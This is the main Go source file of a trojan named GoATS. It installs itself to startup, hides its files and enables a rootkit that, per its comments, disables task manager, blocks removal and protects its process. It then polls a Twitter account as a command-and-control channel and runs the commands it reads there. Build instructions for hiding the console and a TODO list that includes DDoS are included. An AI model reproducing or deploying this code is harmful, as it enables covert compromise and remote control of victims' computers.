/*
GoATS (Golang Advanced Trojan Server) -- Version 0.5 Beta
		https://github.com/user696

This is a trojan made in Go, using Twitter as  the C&C server.

COMMANDS:
	!echo <message> - Logs message to slave console
	!quit - Closes GoATS
	!clear - Tells GoATS to do nothing. Use this command if you don't want slaves to execute latest command on connect.

NOTE: Compile with	go build -o GoATS.exe -ldflags "-H windowsgui" "C:\GoATS.go"	to have no console show.

TODO:
	- Commands
		- DDoS
		- Send messagebox
		- Uninstall
		- Shutdown/Restart
*/

package main

import (
	// Native packages
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
	"os"

	// Homemade packages
	"command"
	"installer"
	"rootkit"
)

var (
	commander string = ""		// Twitter account for Command & Control
	slumber time.Duration = 5		// Time to wait between checking for commands (in seconds)
	cmd string = ""				// Stores latest command. Do not change this variable.

	// DO NOT ENABLE THE BELOW COMMANDS UNLESS YOU KNOW YOUR SHIT!

	enable_install bool = true		// If enabled, GoATS will add itelf to startup
	enable_stealth bool = true		// If enabled, GoATS will add hidden and system attributes to its files
	enable_rootkit bool = true		/* If enabled, this will:
										- Actively cloak GoATS's files from user detection
										- Actively monitor registry to prevent removal from start up
										- Disable task manager and other system tools
										- Protect GoATS's process from termination */
)

func main() {
	fmt.Println("GoATS (Golang Advanced Trojan Server) Loaded.\n")

	fmt.Println("SETTINGS")
	fmt.Println("Location:\t\t", os.Args[0])
	fmt.Println("Commander:\t\t", commander)
	fmt.Println("Refresh interval:\t", int(slumber))
	fmt.Println("Install:\t\t", isTrue(enable_install))
	fmt.Println("Stealth:\t\t", isTrue(enable_stealth))
	fmt.Println("Rootkit:\t\t", isTrue(enable_rootkit), "\n")

	if enable_install {
		installer.Install()
	}

	if enable_stealth && enable_install {
		rootkit.Stealthify()
	}

	if enable_rootkit && enable_stealth && enable_install {
		go rootkit.Install()
	}


	fmt.Println("Commander:\t\t", commander)
	fmt.Println("Refresh interval:\t", int(slumber), "\n")

	fmt.Println("Awaiting commands...")

	for true {
		go refresh()
		time.Sleep(time.Second * slumber)
	}
}

func refresh() {
	lines := getContent()
 	if lines == nil {
 		return
 	}

	for i := 0; i < len(lines); i++ {
		if strings.Contains(lines[i], "data-aria-label-part=\"0\">") {
			temp := strings.Split(strings.Split(lines[i], "data-aria-label-part=\"0\">")[1], "<")[0]
			if cmd != temp && !strings.Contains(temp, "!clear") {
				cmd = temp
				fmt.Println("New command found:", cmd)
				command.Parse(cmd)
			} else if strings.Contains(temp, "!clear") {
				cmd = "!clear"
			}

			i = len(lines)
		}
	}
}

func getContent() (lines []string) {
	res, err := http.Get("https://twitter.com/" + commander)
	if err != nil {
		fmt.Println("Bad connection! Sleeping for", int(slumber), "seconds")
		return nil
	}

	content, err := ioutil.ReadAll(res.Body)
	res.Body.Close()
	if err != nil {
		fmt.Println("Bad connection! Sleeping for", int(slumber), "seconds")
		return nil
	}

	return strings.Split(string(content), "\n")
}

func isTrue(option bool) string {
	if option {
		return "Yes"
	} else {
		return "No"
	}
}
